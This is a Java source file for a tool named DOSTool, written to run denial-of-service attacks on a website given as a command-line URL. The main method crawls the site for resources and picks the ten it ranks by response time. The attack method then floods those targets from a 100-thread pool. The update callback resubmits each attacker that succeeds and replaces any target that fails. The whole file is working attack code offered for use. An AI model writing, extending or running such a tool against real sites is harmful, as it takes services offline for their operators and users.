package com.ehsunbehravesh.dostool;

import com.ehsunbehravesh.dostool.log.LogUtil;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Observable;
import java.util.Observer;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author ehsun.behravesh
 */
public class DOSTool implements Observer {

  public static Level level = Level.ALL;
  private List<Resource> resources;
  private URL baseURL;
  private int threadsOfFinder;
  private int threadsOfAttack;
  private ExecutorService attackExecutor;
  private ResourceFinder resourceFinder;
  private Integer successfulAttacks, failedAttacks;
  private static final Logger logger = LogUtil.createLogger();
  private List<Resource> resourcesToAttack;

  static {
    logger.setLevel(DOSTool.level);
  }

  public DOSTool(URL baseURL) {
    this.baseURL = baseURL;
    this.threadsOfFinder = 10;
    this.threadsOfAttack = 100;
    successfulAttacks = 0;
    failedAttacks = 0;
  }

  public void findResources() {
    resourceFinder = new ResourceFinder(baseURL, threadsOfFinder);
    resourceFinder.addObserver(new Observer() {
      @Override
      public void update(Observable o, Object arg) {
        resources = resourceFinder.getResources();
      }
    });
    new Thread(resourceFinder).start();
  }

  private synchronized void incrementSuccessfulAttacks() {
    successfulAttacks++;
  }

  private synchronized void incrementFailedAttacks() {
    failedAttacks++;
  }

  public List<Resource> getResources() {
    return resources;
  }

  public void setResources(List<Resource> resources) {
    this.resources = resources;
  }

  public URL getBaseURL() {
    return baseURL;
  }

  public void setBaseURL(URL baseURL) {
    this.baseURL = baseURL;
  }

  public int getThreadsOfFinder() {
    return threadsOfFinder;
  }

  public void setThreadsOfFinder(int threadsOfFinder) {
    this.threadsOfFinder = threadsOfFinder;
  }

  public int getThreadsOfAttack() {
    return threadsOfAttack;
  }

  public void setThreadsOfAttack(int threadsOfAttack) {
    this.threadsOfAttack = threadsOfAttack;
  }

  private void attack() {
    attackExecutor = Executors.newFixedThreadPool(threadsOfAttack);

    int i = 0;
    while (i < threadsOfAttack) {
      for (Resource resource : resourcesToAttack) {
        ResourceAttacker resourceAttacker = new ResourceAttacker(resource);
        resourceAttacker.addObserver(this);
        attackExecutor.execute(resourceAttacker);
        i++;
      }      
    }

    while (!attackExecutor.isTerminated()) {
      logger.log(Level.INFO, "Attack is under progress: successful {0} - failed: {1}",
              new Object[]{successfulAttacks, failedAttacks});
      try {
        Thread.sleep(5000);
      } catch (InterruptedException ex) {
        logger.log(Level.SEVERE, "Error!");
      }
    }
  }

  @Override
  public void update(Observable o, Object arg) {
    if (o instanceof ResourceAttacker) {
      ResourceAttacker attacker = (ResourceAttacker) o;
      Boolean error = (Boolean) arg;
      if (error) {
        incrementFailedAttacks();
        replaceTheAttackResource(attacker.getResource());
      } else {
        incrementSuccessfulAttacks();
        attackExecutor.execute(attacker);
      }
    }
  }

  private void replaceTheAttackResource(Resource resource) {
    if (resourcesToAttack.contains(resource)) {
      resourcesToAttack.remove(resource);
    }

    boolean added = false;
    int i = 0;
    while (!added) {
      Resource resource1 = resources.get(i++);
      if (!resourcesToAttack.contains(resource1)) {
        resourcesToAttack.add(resource1);
        added = true;
        attackExecutor.execute(new ResourceAttacker(resource1));
        logger.log(Level.INFO, "Resource {0} has been replaced by {1}",
                new Object[]{resource.getUrl().toString(),
          resource1.getUrl().toString()});
      }
    }
  }

  public List<Resource> getResourcesToAttack() {
    return resourcesToAttack;
  }

  public void setResourcesToAttack(List<Resource> resourcesToAttack) {
    this.resourcesToAttack = resourcesToAttack;
  }

  public static void main(String[] args) throws MalformedURLException {
    if (args.length <= 0) {
      System.out.println("Please enter the URL to attack.");
    } else {

      DOSTool dosTool = new DOSTool(new URL(args[0]));

      if (args.length > 1) {
        dosTool.setThreadsOfFinder(Integer.parseInt(args[1]));
      }

      if (args.length > 2) {
        dosTool.setThreadsOfAttack(Integer.parseInt(args[2]));
      }

      dosTool.findResources();

      while (dosTool.getResources() == null) {
        try {
          Thread.sleep(10000);
        } catch (InterruptedException ex) {
          logger.log(Level.SEVERE, "Error!");
        }
      }

      logger.log(Level.INFO, "Resources: {0}", dosTool.getResources().size());

      int topLength = Math.min(10, dosTool.getResources().size());
      logger.log(Level.INFO, "Top {0} resources based on response time: ", topLength);

      dosTool.setResourcesToAttack(new ArrayList<Resource>());

      for (int i = 0; i < topLength; i++) {
        Resource resource = dosTool.getResources().get(i);
        dosTool.getResourcesToAttack().add(resource);
        logger.log(Level.INFO, "Response Time {0}: {1}",
                new Object[]{resource.getResponseTime(), resource.getUrl().toString()});

      }

      dosTool.attack();
    }
  }
}
